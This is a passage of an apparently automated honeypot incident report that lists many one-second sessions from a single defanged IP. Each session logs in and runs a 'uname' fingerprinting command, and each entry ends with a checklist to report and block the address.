| `2026-08-14 07:07:31` | `cowrie.log.closed` |
| `2026-08-14 07:07:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c24800185c69

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:34` | `cowrie.session.connect` |
| `2026-08-14 07:07:34` | `cowrie.client.version` |
| `2026-08-14 07:07:34` | `cowrie.client.kex` |
| `2026-08-14 07:07:34` | `cowrie.login.success` |
| `2026-08-14 07:07:35` | `cowrie.session.params` |
| `2026-08-14 07:07:35` | `cowrie.command.input` |
| `2026-08-14 07:07:35` | `cowrie.log.closed` |
| `2026-08-14 07:07:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-63083d0f2be6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:39` | `cowrie.session.connect` |
| `2026-08-14 07:07:39` | `cowrie.client.version` |
| `2026-08-14 07:07:39` | `cowrie.client.kex` |
| `2026-08-14 07:07:39` | `cowrie.login.success` |
| `2026-08-14 07:07:40` | `cowrie.session.params` |
| `2026-08-14 07:07:40` | `cowrie.command.input` |
| `2026-08-14 07:07:40` | `cowrie.log.closed` |
| `2026-08-14 07:07:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ccb391c7a98

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:44` | `cowrie.session.connect` |
| `2026-08-14 07:07:44` | `cowrie.client.version` |
| `2026-08-14 07:07:44` | `cowrie.client.kex` |
| `2026-08-14 07:07:44` | `cowrie.login.success` |
| `2026-08-14 07:07:45` | `cowrie.session.params` |
| `2026-08-14 07:07:45` | `cowrie.command.input` |
| `2026-08-14 07:07:45` | `cowrie.log.closed` |
| `2026-08-14 07:07:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42cee0f0fad3

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:49` | `cowrie.session.connect` |
| `2026-08-14 07:07:49` | `cowrie.client.version` |
| `2026-08-14 07:07:49` | `cowrie.client.kex` |
| `2026-08-14 07:07:49` | `cowrie.login.success` |
| `2026-08-14 07:07:50` | `cowrie.session.params` |
| `2026-08-14 07:07:50` | `cowrie.command.input` |
| `2026-08-14 07:07:50` | `cowrie.log.closed` |
| `2026-08-14 07:07:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2fd8228f0094

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:07 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:54` | `cowrie.session.connect` |
| `2026-08-14 07:07:54` | `cowrie.client.version` |
| `2026-08-14 07:07:54` | `cowrie.client.kex` |
| `2026-08-14 07:07:54` | `cowrie.login.success` |
| `2026-08-14 07:07:55` | `cowrie.session.params` |
| `2026-08-14 07:07:55` | `cowrie.command.input` |
| `2026-08-14 07:07:55` | `cowrie.log.closed` |
| `2026-08-14 07:07:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2e383c747023

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:07 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:07:59` | `cowrie.session.connect` |
| `2026-08-14 07:07:59` | `cowrie.client.version` |
| `2026-08-14 07:07:59` | `cowrie.client.kex` |
| `2026-08-14 07:07:59` | `cowrie.login.success` |
| `2026-08-14 07:08:00` | `cowrie.session.params` |
| `2026-08-14 07:08:00` | `cowrie.command.input` |
| `2026-08-14 07:08:00` | `cowrie.log.closed` |
| `2026-08-14 07:08:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f882f39650b9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:04` | `cowrie.session.connect` |
| `2026-08-14 07:08:04` | `cowrie.client.version` |
| `2026-08-14 07:08:04` | `cowrie.client.kex` |
| `2026-08-14 07:08:04` | `cowrie.login.success` |
| `2026-08-14 07:08:05` | `cowrie.session.params` |
| `2026-08-14 07:08:05` | `cowrie.command.input` |
| `2026-08-14 07:08:05` | `cowrie.log.closed` |
| `2026-08-14 07:08:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f12b5baa4e5e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:09` | `cowrie.session.connect` |
| `2026-08-14 07:08:09` | `cowrie.client.version` |
| `2026-08-14 07:08:09` | `cowrie.client.kex` |
| `2026-08-14 07:08:09` | `cowrie.login.success` |
| `2026-08-14 07:08:10` | `cowrie.session.params` |
| `2026-08-14 07:08:10` | `cowrie.command.input` |
| `2026-08-14 07:08:10` | `cowrie.log.closed` |
| `2026-08-14 07:08:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05ba538b048e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:14` | `cowrie.session.connect` |
| `2026-08-14 07:08:14` | `cowrie.client.version` |
| `2026-08-14 07:08:14` | `cowrie.client.kex` |
| `2026-08-14 07:08:15` | `cowrie.login.success` |
| `2026-08-14 07:08:15` | `cowrie.session.params` |
| `2026-08-14 07:08:15` | `cowrie.command.input` |
| `2026-08-14 07:08:15` | `cowrie.log.closed` |
| `2026-08-14 07:08:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5c277a297da1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:19` | `cowrie.session.connect` |
| `2026-08-14 07:08:19` | `cowrie.client.version` |
| `2026-08-14 07:08:19` | `cowrie.client.kex` |
| `2026-08-14 07:08:20` | `cowrie.login.success` |
| `2026-08-14 07:08:20` | `cowrie.session.params` |
| `2026-08-14 07:08:20` | `cowrie.command.input` |
| `2026-08-14 07:08:20` | `cowrie.log.closed` |
| `2026-08-14 07:08:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9359ee997fff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:24` | `cowrie.session.connect` |
| `2026-08-14 07:08:24` | `cowrie.client.version` |
| `2026-08-14 07:08:24` | `cowrie.client.kex` |
| `2026-08-14 07:08:25` | `cowrie.login.success` |
| `2026-08-14 07:08:26` | `cowrie.session.params` |
| `2026-08-14 07:08:26` | `cowrie.command.input` |
| `2026-08-14 07:08:26` | `cowrie.log.closed` |
| `2026-08-14 07:08:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-238ab96bef3a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:30` | `cowrie.session.connect` |
| `2026-08-14 07:08:30` | `cowrie.client.version` |
| `2026-08-14 07:08:30` | `cowrie.client.kex` |
| `2026-08-14 07:08:30` | `cowrie.login.success` |
| `2026-08-14 07:08:31` | `cowrie.session.params` |
| `2026-08-14 07:08:31` | `cowrie.command.input` |
| `2026-08-14 07:08:31` | `cowrie.log.closed` |
| `2026-08-14 07:08:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5384f22f66f8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:35` | `cowrie.session.connect` |
| `2026-08-14 07:08:35` | `cowrie.client.version` |
| `2026-08-14 07:08:35` | `cowrie.client.kex` |
| `2026-08-14 07:08:35` | `cowrie.login.success` |
| `2026-08-14 07:08:36` | `cowrie.session.params` |
| `2026-08-14 07:08:36` | `cowrie.command.input` |
| `2026-08-14 07:08:36` | `cowrie.log.closed` |
| `2026-08-14 07:08:36` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e2ac790ae474

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:40` | `cowrie.session.connect` |
| `2026-08-14 07:08:40` | `cowrie.client.version` |
| `2026-08-14 07:08:40` | `cowrie.client.kex` |
| `2026-08-14 07:08:40` | `cowrie.login.success` |
| `2026-08-14 07:08:41` | `cowrie.session.params` |
| `2026-08-14 07:08:41` | `cowrie.command.input` |
| `2026-08-14 07:08:41` | `cowrie.log.closed` |
| `2026-08-14 07:08:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32a7313d00aa

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:45` | `cowrie.session.connect` |
| `2026-08-14 07:08:45` | `cowrie.client.version` |
| `2026-08-14 07:08:45` | `cowrie.client.kex` |
| `2026-08-14 07:08:45` | `cowrie.login.success` |
| `2026-08-14 07:08:46` | `cowrie.session.params` |
| `2026-08-14 07:08:46` | `cowrie.command.input` |
| `2026-08-14 07:08:46` | `cowrie.log.closed` |
| `2026-08-14 07:08:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd8607bd10cc

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:50` | `cowrie.session.connect` |
| `2026-08-14 07:08:50` | `cowrie.client.version` |
| `2026-08-14 07:08:50` | `cowrie.client.kex` |
| `2026-08-14 07:08:51` | `cowrie.login.success` |
| `2026-08-14 07:08:51` | `cowrie.session.params` |
| `2026-08-14 07:08:51` | `cowrie.command.input` |
| `2026-08-14 07:08:52` | `cowrie.log.closed` |
| `2026-08-14 07:08:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0c089dae341

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:08 |
| **Last Seen** | 2026-08-14 07:08 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:08:55` | `cowrie.session.connect` |
| `2026-08-14 07:08:55` | `cowrie.client.version` |
| `2026-08-14 07:08:55` | `cowrie.client.kex` |
| `2026-08-14 07:08:55` | `cowrie.login.success` |
| `2026-08-14 07:08:56` | `cowrie.session.params` |
| `2026-08-14 07:08:56` | `cowrie.command.input` |
| `2026-08-14 07:08:57` | `cowrie.log.closed` |
| `2026-08-14 07:08:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-44d93cb1248a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:00` | `cowrie.session.connect` |
| `2026-08-14 07:09:00` | `cowrie.client.version` |
| `2026-08-14 07:09:00` | `cowrie.client.kex` |
| `2026-08-14 07:09:00` | `cowrie.login.success` |
| `2026-08-14 07:09:01` | `cowrie.session.params` |
| `2026-08-14 07:09:01` | `cowrie.command.input` |
| `2026-08-14 07:09:01` | `cowrie.log.closed` |
| `2026-08-14 07:09:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36a083f6390e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:05` | `cowrie.session.connect` |
| `2026-08-14 07:09:05` | `cowrie.client.version` |
| `2026-08-14 07:09:05` | `cowrie.client.kex` |
| `2026-08-14 07:09:05` | `cowrie.login.success` |
| `2026-08-14 07:09:06` | `cowrie.session.params` |
| `2026-08-14 07:09:06` | `cowrie.command.input` |
| `2026-08-14 07:09:06` | `cowrie.log.closed` |
| `2026-08-14 07:09:06` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bdd6b37352d4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:10` | `cowrie.session.connect` |
| `2026-08-14 07:09:10` | `cowrie.client.version` |
| `2026-08-14 07:09:10` | `cowrie.client.kex` |
| `2026-08-14 07:09:10` | `cowrie.login.success` |
| `2026-08-14 07:09:11` | `cowrie.session.params` |
| `2026-08-14 07:09:11` | `cowrie.command.input` |
| `2026-08-14 07:09:12` | `cowrie.log.closed` |
| `2026-08-14 07:09:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-96f932a2998c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:15` | `cowrie.session.connect` |
| `2026-08-14 07:09:15` | `cowrie.client.version` |
| `2026-08-14 07:09:15` | `cowrie.client.kex` |
| `2026-08-14 07:09:16` | `cowrie.login.success` |
| `2026-08-14 07:09:16` | `cowrie.session.params` |
| `2026-08-14 07:09:16` | `cowrie.command.input` |
| `2026-08-14 07:09:16` | `cowrie.log.closed` |
| `2026-08-14 07:09:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b82126afbca

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:20` | `cowrie.session.connect` |
| `2026-08-14 07:09:20` | `cowrie.client.version` |
| `2026-08-14 07:09:20` | `cowrie.client.kex` |
| `2026-08-14 07:09:21` | `cowrie.login.success` |
| `2026-08-14 07:09:22` | `cowrie.session.params` |
| `2026-08-14 07:09:22` | `cowrie.command.input` |
| `2026-08-14 07:09:22` | `cowrie.log.closed` |
| `2026-08-14 07:09:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4fee50168026

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:25` | `cowrie.session.connect` |
| `2026-08-14 07:09:25` | `cowrie.client.version` |
| `2026-08-14 07:09:25` | `cowrie.client.kex` |
| `2026-08-14 07:09:26` | `cowrie.login.success` |
| `2026-08-14 07:09:26` | `cowrie.session.params` |
| `2026-08-14 07:09:26` | `cowrie.command.input` |
| `2026-08-14 07:09:26` | `cowrie.log.closed` |
| `2026-08-14 07:09:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b624dd9c3a46

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:30` | `cowrie.session.connect` |
| `2026-08-14 07:09:30` | `cowrie.client.version` |
| `2026-08-14 07:09:30` | `cowrie.client.kex` |
| `2026-08-14 07:09:30` | `cowrie.login.success` |
| `2026-08-14 07:09:31` | `cowrie.session.params` |
| `2026-08-14 07:09:31` | `cowrie.command.input` |
| `2026-08-14 07:09:31` | `cowrie.log.closed` |
| `2026-08-14 07:09:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-729ac265b6ad

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-14 07:09:35` | `cowrie.session.connect` |
| `2026-08-14 07:09:35` | `cowrie.client.version` |
| `2026-08-14 07:09:35` | `cowrie.client.kex` |
| `2026-08-14 07:09:36` | `cowrie.login.success` |
| `2026-08-14 07:09:37` | `cowrie.session.params` |
| `2026-08-14 07:09:37` | `cowrie.command.input` |
| `2026-08-14 07:09:37` | `cowrie.log.closed` |
| `2026-08-14 07:09:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.47[.]53` to AbuseIPDB if not already reported
- [ ] Block `91.92.47[.]53` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a0cfe6b0aa2b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.47[.]53` |
| **First Seen** | 2026-08-14 07:09 |
| **Last Seen** | 2026-08-14 07:09 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

